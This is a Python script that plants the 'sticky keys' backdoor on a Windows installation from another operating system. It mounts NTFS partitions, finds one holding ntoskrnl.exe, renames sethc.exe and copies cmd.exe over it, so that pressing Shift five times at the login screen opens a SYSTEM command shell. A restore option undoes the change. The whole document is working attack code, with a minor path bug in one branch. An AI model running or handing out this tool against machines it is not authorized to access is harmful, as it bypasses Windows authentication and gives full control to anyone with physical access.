import psutil
import os
import subprocess
import tempfile
import shutil
import sys
def check_for_ntoskrnl(partition):
    ntoskrnl_path = os.path.join(partition, 'Windows', 'System32', 'ntoskrnl.exe')
    return os.path.exists(ntoskrnl_path)
def inject_sethc(partition):
    sethc_path = os.path.join(partition, 'Windows', 'System32', 'sethc.exe')
    new_sethc_path = os.path.join(partition, 'Windows', 'System32', 'cmd.exe')
    if not os.path.exists(sethc_path):
        print("Original sethc.exe not found. Aborting.")
        return False
    try:
        os.rename(sethc_path, sethc_path + ".old")
        print("Original sethc.exe renamed to sethc.exe.old")
    except Exception as e:
        print(f"Error while renaming sethc.exe: {e}")
        return False
    try:
        shutil.copy(new_sethc_path, sethc_path)
        print("New sethc.exe copied successfully.")
        print("Now you can reboot to your system and press shift 5 times")
    except Exception as e:
        print(f"Error while copying new sethc.exe: {e}")
        return False
def restore_sethc(partition):
    backup_path = os.path.join(partition, 'Windows', 'System32', 'sethc.exe.old')
    sethc_path = os.path.join(partition, 'Windows', 'System32', 'sethc.exe')
    if not os.path.exists(backup_path):
        print("sethc.exe.old not found. Aborting.")
        return False
    try:
        os.remove(sethc_path)
        print("Deleted backdoored sethc.exe")
    except Exception as e:
        print(f"Error while removing sethc.exe: {e}")
        return False
    try:
        os.rename(backup_path, sethc_path)
        print("Original sethc.exe restored")
    except Exception as e:
        print(f"Error while renaming sethc.exe.old: {e}")
        return False
def find_windows_partitions():
    partitions = psutil.disk_partitions()
    found_windows = False
    parts = []
    for partition in partitions:
        if partition.fstype.lower() == 'ntfs':
            if check_for_ntoskrnl(partition.mountpoint):
                print(f"Found Windows partition: {partition.device}")
                if sys.argv[1] == '--inject':
                    inject_sethc(partition.device)
                elif sys.argv[1] == '--restore':
                    restore_sethc(partition.device)
                found_windows = True
                break
    if not found_windows:
        print("No mounted Windows partitions found. Attempting to mount and check all partitions...")
        lsblk_output = subprocess.check_output(['lsblk', '-o', 'NAME,MOUNTPOINT,FSTYPE', '-rn']).decode('utf-8')
        lines = lsblk_output.splitlines()
        parts = [line.split() for line in lines if len(line.split()) > 1]
        for part in parts:
            if len(part) > 1:
                if part[1] == 'ntfs':
                    temp_dir = tempfile.mkdtemp()
                    try:
                        subprocess.run(['ntfs-3g', f'/dev/{part[0]}', temp_dir])
                        if check_for_ntoskrnl(temp_dir):
                            print(f"Found Windows partition: /dev/{part[0]}")
                            found_windows = True
                            print(f'mounted at : {temp_dir}')
                            if sys.argv[1] == '--inject':
                                inject_sethc(temp_dir)
                            elif sys.argv[1] == '--restore':
                                restore_sethc(temp_dir)
                            break
                        subprocess.run(['umount', temp_dir])
                    except Exception as e:
                        print(f"Error mounting /dev/{part[0]}: {str(e)}")
                        
    if not found_windows:
        print("No Windows partitions found.")
find_windows_partitions()
input("press enter to return")
